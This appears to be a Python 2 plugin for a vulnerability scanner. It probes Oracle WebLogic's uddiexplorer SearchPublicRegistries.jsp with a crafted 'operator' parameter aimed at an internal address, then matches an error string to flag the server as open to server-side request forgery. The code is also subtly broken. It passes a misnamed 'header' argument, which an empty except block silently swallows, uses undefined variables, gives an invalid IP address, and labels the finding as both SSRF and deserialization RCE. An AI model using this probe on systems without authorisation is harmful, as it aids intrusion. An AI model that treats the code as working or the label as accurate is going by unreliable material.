#!/usr/bin/env python

import re
import requests
import urlparse
from config import *

def verify(task):

    url = task['url']
    headers = task['headers']

    parsed_url = urlparse.urlparse(url)
    target = 'http://%s/' % (parsed_url.netloc) + '/uddiexplorer/SearchPublicRegistries.jsp?operator=operator' \
                                         '=10.301.0.0:80&rdoSearch=name&txtSearchname=sdf&' \
                                         'txtSearchkey=&txtSearchfor=&selfor=Businesslocation&btnSubmit=Search'
    try:
        req = requests.get(target, header=headers)
        code = req.status_code
        res = req.content
        # print res
        if code == 200 and 'weblogic.uddi.client.structures.exception.' \
                        'XML_SoapException: no protocol: operator=10.301.0.0:80' in res:
            message = {
                'type': 'Weblogic SSRF',
                'url': 'http://%s:%s/' % (ip, port),
                'info': 'Weblogic Unserialize RCE :\n\n http://%s/' % (target),
                'method': 'GET',
                'param': ''
            }
            save_to_database(message)
            return message
    except Exception as e:
        pass
